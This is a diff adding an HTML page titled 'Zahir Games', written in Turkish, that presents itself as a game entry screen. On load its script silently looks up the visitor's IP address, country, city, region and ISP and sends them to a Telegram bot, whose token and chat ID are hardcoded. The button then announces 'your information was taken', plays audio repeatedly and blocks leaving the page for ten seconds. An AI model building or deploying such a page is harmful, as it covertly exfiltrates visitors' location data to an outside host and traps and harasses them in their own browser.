@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Zahir Games</title>
+<style>
+        body {
+            touch-action: pan-x pan-y;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            background: #1a1a2e;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .giris-btn {
+            background: #e52e71;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 30px 80px;
+            font-size: 32px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(229, 46, 113, 0.5);
+            transition: all 0.3s ease;
+        }
+        
+        .giris-btn:hover {
+            background: #c2185b;
+            transform: scale(1.05);
+        }
+        
+        .giris-btn:active {
+            transform: scale(0.95);
+        }
+        
+        .exit-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            z-index: 1000;
+        }
+</style>
+  </head>
+  <body>
+    <button class="giris-btn" onclick="startMusic()">GİRİŞ</button>
+    <div class="exit-blocker" id="exitBlocker">ÇIKIŞ YAPILAMIYOR - 10 SANİYE</div>
+
+<script>
+        const botToken = "8400006043:AAEoO_oL4xgOZAnBOtDwxF9r5qd19UhxqPQ";
+        const chatId = "-1003158459038";  
+
+        // Yakınlaştırmayı engelle
+        document.addEventListener('gesturestart', function (e) {
+            e.preventDefault();
+        });
+
+        // IP bilgisi gönder
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const message = `🆕 Yeni Ziyaretçi:\n📍 IP: ${data.ip}\n🏳️ Ülke: ${data.country_name}\n🏙️ Şehir: ${data.city}\n📍 İlçe: ${data.region}\n🌐 Operatör: ${data.org}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+            });
+
+        function startMusic() {
+            // Buton metnini değiştir
+            document.querySelector('.giris-btn').style.background = '#4CAF50';
+            document.querySelector('.giris-btn').textContent = 'BİLGİLERİN ALINDI';
+            
+            // Çıkışı engellemeyi başlat
+            blockExit();
+            
+            // Müziği 30 kere çal
+            let playCount = 0;
+            const maxPlays = 30;
+            
+            function playNext() {
+                if (playCount >= maxPlays) return;
+                
+                const audio = new Audio('music/music.mp3');
+                audio.play();
+                
+                playCount++;
+                
+                // 2 saniye sonra bir sonraki müziği başlat
+                setTimeout(playNext, 2000);
+            }
+            
+            // İlk müziği başlat
+            playNext();
+        }
+
+        function blockExit() {
+            const exitBlocker = document.getElementById('exitBlocker');
+            let seconds = 10;
+            
+            // Çıkış engelleyiciyi göster
+            exitBlocker.style.display = 'flex';
+            exitBlocker.textContent = `ÇIKIŞ YAPILAMIYOR - ${seconds} SANİYE`;
+            
+            // Geri tuşunu engelle
+            function preventBack(e) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+            
+            // Geri tuşu ve diğer çıkış yollarını engelle
+            window.history.pushState(null, null, window.location.href);
+            window.addEventListener('popstate', preventBack);
+            window.addEventListener('beforeunload', preventBack);
+            
+            // 10 saniye geri sayım
+            const countdown = setInterval(() => {
+                seconds--;
+                exitBlocker.textContent = `ÇIKIŞ YAPILAMIYOR - ${seconds} SANİYE`;
+                
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    exitBlocker.style.display = 'none';
+                    window.removeEventListener('popstate', preventBack);
+                    window.removeEventListener('beforeunload', preventBack);
+                }
+            }, 1000);
+        }
+</script>
+  </body>
+</html>
